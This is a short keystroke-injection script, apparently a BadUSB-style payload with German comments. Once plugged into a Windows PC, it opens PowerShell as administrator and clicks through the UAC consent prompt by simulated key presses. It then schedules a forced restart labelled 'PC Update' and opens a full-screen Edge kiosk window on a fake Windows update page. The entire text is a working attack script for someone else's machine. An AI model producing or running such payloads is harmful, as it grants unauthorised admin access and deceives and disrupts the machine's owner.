layout("de"); //Deutsche Tastatur gewählt
typingSpeed(100,150)

press("GUI X") //Ich öffne das Win+X Menü
delay(2000) //Warten bis das Menü vollständig geladen ist
press("a") //Mit a öffne ich im Menü nun Powershell
delay(2000)

//Jetzt muss ich die Zustimmung für Administrator geben
press("LEFT_ARROW")
delay(2000)
press("ENTER")
delay(2000)

//Jetzt schreiben wir unseren Command rein
type("shutdown /r /t 500 /c (\"PC Update\")")
delay(2000)
press("ENTER")
delay(2000)
press("ENTER")
delay(2000)

//Jetzt kommt der Fake Update Bildschirm
type("Start-Process msedge -ArgumentList (\"-k http://fakeupdate.net/win10ue\")")
delay(2000)
press("ENTER")
delay(2000)
press("F11")
